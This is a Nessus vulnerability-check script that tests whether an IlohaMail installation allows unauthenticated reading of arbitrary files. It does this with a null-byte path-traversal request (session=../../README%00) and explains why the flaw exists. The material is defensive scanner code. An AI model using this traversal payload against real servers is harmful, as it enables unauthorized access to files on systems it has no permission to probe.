#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

if (description) {
  script_id(14631);
  script_version("$Revision: 1.1 $");

# script_cve_id("CVE-MAP-NOMATCH");
# NOTE: no CVE id assigned (gat, 09/2004)
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"7335");
  }
 
  name["english"] = "IlohaMail Arbitrary File Access via Session Variable Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
The target is running at least one instance of IlohaMail version
0.7.11 or earlier.  Such versions contain a flaw in the processing of
the session variable that allows an unauthenticated attacker to
retrieve arbitrary files available to the web user, provided the
filesystem backend is in use. 

Solution : Upgrade to IlohaMail version 0.7.12 or later.

Risk factor : Medium";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for Arbitrary File Access via Session Variable vulnerability in IlohaMail";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2004 George A. Theall");

  family["english"] = "Remote file access";
  script_family(english:family["english"]);

  script_dependencie("global_settings.nasl", "ilohamail_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

# Specify the file to grab from target, relative to IlohaMail/sessions 
# directory.
#
# nb: ../../README exists in each version I've seen.
file = "../../README";

host = get_host_name();
port = get_http_port(default:80);
if (debug_level) display("debug: searching for IlohaMail Arbitrary File Access via Session Variable vulnerability on ", host, ":", port, ".\n");

if (!get_port_state(port)) exit(0);

# Check each installed instance, stopping if we find a vulnerable version.
installs = get_kb_list(string("www/", port, "/ilohamail"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];
    if (debug_level) display("debug: checking version ", ver, " under ", dir, ".\n");

    # Try to exploit the vulnerability.
    #
    # nb: the hole exists because session_auth.FS.inc trusts
    #     the session variable when calling include_once() to 
    #     validate the session.
    url = string(dir, "/index.php?session=", file, "%00");
    if (debug_level) display("debug: retrieving ", url, "...\n");
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if (res == NULL) exit(0);           # can't connect
    if (debug_level) display("debug: res =>>", res, "<<\n");

    # nb: if successful, file contents will appear after the closing 
    #     HEAD tag; otherwise, there will be a message about a session
    #     timeout. Regardless, we only need check the first 5 lines or so.
    lines = split(res);
    nlines = max_index(lines) - 1;
    for (i = 0; i <= nlines; i++) {
      if (lines[i] =~ "</HEAD>") {
        next = lines[i+1];
        if (debug_level) display("debug: next=>>", next, "<<\n");
        if (next !~ "Session timeout") {
          security_warning(port);
          exit(0);
        }
        # nb: no need to check any further.
        break;
      }
    }
  }
}
